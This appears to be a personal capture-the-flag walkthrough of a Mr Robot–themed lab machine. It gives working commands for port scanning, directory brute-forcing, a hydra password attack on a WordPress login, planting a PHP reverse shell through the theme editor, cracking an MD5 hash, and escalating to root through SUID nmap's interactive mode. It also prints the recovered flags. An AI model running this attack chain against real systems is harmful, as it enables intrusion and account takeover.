** Open VPN **

> connect to ip: run nmap on it using
	> nmap -A <IP> -oN(output Normal) <Tar-Output-file>
----
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-07 18:55 CEST
Nmap scan report for 10.10.237.243
Host is up (0.024s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

----

PORT 80 is open
> run the <IP>:<OPEN PORT> in firefox to see what is there

- GOBUSTER -
looking for other hidden directories
> gobuster dir -u http://10.10.237.243 -w
	~/dbust-lists/list/directories-list-2.3.small.txt -t 30 | tee mrRobDir.txt

> save all the directories open on 200
	> cat mrRobDirs.txt | grep 200 > mrRobDirs.txt
-- 
	/sitemap: nothing of note
	/intro: short video
	/wp-login: standard wp login
	/license: funny 'lil' msg
	/readme: funny msg again
	/robots: User-agent: *
				fsocity.dic
				key-1-of-3.txt
	> go to <IP>/key-1-of-3.txt
	073403c8a58a1f80d943455fb30724b9

--

> Going to <IP>/fsocity.dic
	> gives a wordlist

strings fsocity.dic | sort -u > wordpress_brute.dic
	> shorten the run time of the list
	---
	HYDRA FLAGS
	-f Stop brute forcing the login page once the password is found
	-V Display the attempts being made by hydra and other details
	-t Number of connects/tasks being run in parallel(rec 4)
	-https-form-post indicateds the type of form being used
	-/wp-login.php name of login page
	- ^USER^ tells HYDRA to use username listed in field
	- ^PASS^ tells HYDRA to use wordlist provided
	-l indicates a single username (-L for username list)
	-P indicates use the following passowrd list

	--- THIS ONE ACTUALLY FUCKING WORKED ---
	hydra -l Elliot -P wordpress_brute.dic 10.10.162.66 http-post-form "/wp-login:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=10.10.157.219/wp-admin/&testcookie=1:S=302" -t 4 -d

[80][http-post-form] host: 10.10.162.66   login: Elliot   password: ER28-0652


-- installed pwncat for reverse shell.
	> go to Apperance->Editor->Archives.
	> Place in the PHP-REVERSE-SHELL
	> CHANGE IP VARIABLE to local ip
	> CHANGE PORT VARIABLE to something that youll remember
	> update and open netcat to listen on the specified port
	>  in second window go to the reservse shell
		http://10.10.86.39/wp-content/themes/twentyfifteen/archive.php
	> run NCAT on it ncat -l(listenl)p(port) 1234 
	> go to home/robot/password....
		robot:c3fcd3d76192e4007dfb496cca67e13b
	> use md5 decryption online
		> password is abcdefghijklmnopqrstuvwxyz
	> sudo into using password found
	> must be run from terminal use
	 - echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
	 > su robot
	 	abcdefghijklmnopqrstuvwxyz
	> cat key-2-of-3.txt
		822c73956184f694993bede3eb39f959
	
---- final key ----

need to excalted privledges to root. A common way to escalate is to use files
with the SUID flag set to true. This flag means the files run with root
permissions. Use FIND to search for files with this flag set.

>>
	find / -perm -u=s -type f 2>/dev/null
	nmap is running with SUID and has an old verision with an interactive 	
		mode. This means it can be used to execute commands as root.
	nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
# ls
ls
key-2-of-3.txt	password.raw-md5
# cd
cd
# ls
ls
key-2-of-3.txt	password.raw-md5
# pwd
pwd
/home/robot
# cd ..
cd ..
# ls
ls
robot
# cd ..
cd ..
# ls
ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
# cd root
cd root
# ls
ls
firstboot_done	key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt

		---- AND HERE IT IS ----
		04787ddef27c3dee1ee161b21670b4e4
